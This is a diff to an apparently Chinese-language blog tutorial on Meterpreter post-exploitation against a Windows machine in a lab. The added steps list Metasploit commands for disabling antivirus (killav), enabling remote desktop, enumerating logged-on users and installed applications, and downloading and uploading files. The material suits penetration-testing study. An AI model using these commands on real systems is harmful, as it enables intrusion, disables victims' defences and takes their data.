@@ -77,7 +77,30 @@
 <pre><code>       进程迁移完成后，原先PID为3684的进程会自动关闭，如果没有自动关闭可以输入kill 3684命令“杀掉”进程。
        使用自动迁移进程命令（run post/windows/manage/migrate）后，系统会自动寻找合适的进程然后迁移。</code></pre>
 <p><img src="/images/pasted-94.png" alt="upload successful"></p>
-<pre><code>       如图所示，系统已经自动把原来PID为3152的进程迁移到3240中。</code></pre>
+<pre><code>       如图所示，系统已经自动把原来PID为3152的进程迁移到3240中。
+
+       获得了稳定的进程后，收集系统信息。
+       先输入sysinfo命令查看目标机的系统信息，例如操作系统和体系结构</code></pre>
+<p><img src="/images/pasted-95.png" alt="upload successful"></p>
+<pre><code>       输入run post/windows/gather/checkvm命令检查目标机是否运行在虚拟机上
+       可以看到当前目标机正运行在一个VMvare虚拟机上。</code></pre>
+<p><img src="/images/pasted-96.png" alt="upload successful"></p>
+<pre><code>       现在检查目标机是否正在运行，输入idletime命令可以看到目标机最近的运行时间，可看到正在运行，而且已经运行了47分钟32秒。</code></pre>
+<p><img src="/images/pasted-97.png" alt="upload successful"></p>
+<pre><code>      输入run post/windows/manage/killav命令关闭目标机系统杀毒软件，如果失败就有可能是权限的问题了</code></pre>
+<p><img src="/images/pasted-99.png" alt="upload successful">  </p>
+<pre><code>     输入run post/windows/manage/enable_rdp命令启动目标机的远程桌面协议</code></pre>
+<p><img src="/images/pasted-100.png" alt="upload successful"></p>
+<pre><code>     添加路由后可使用run post/windows/gather/enum_logged_on_users命令列举当前有多少用户登录了目标机，可以看到有两个用户，并且administrator目前登录了系统</code></pre>
+<p><img src="/images/pasted-101.png" alt="upload successful"></p>
+<pre><code>     列举安装在目标机上的应用程序run post/windows/gather/enum_applications </code></pre>
+<p><img src="/images/pasted-102.png" alt="upload successful"></p>
+<pre><code>     下载文件
+     download test.txt/root 下载目标桌面的文件到攻击机器root下</code></pre>
+<p><img src="/images/pasted-103.png" alt="upload successful"></p>
+<pre><code>     上传文件
+     upload /root/test.txt c:\</code></pre>
+<p><img src="/images/pasted-104.png" alt="upload successful"></p>
 <div id="gitalk-container"></div>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
 <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
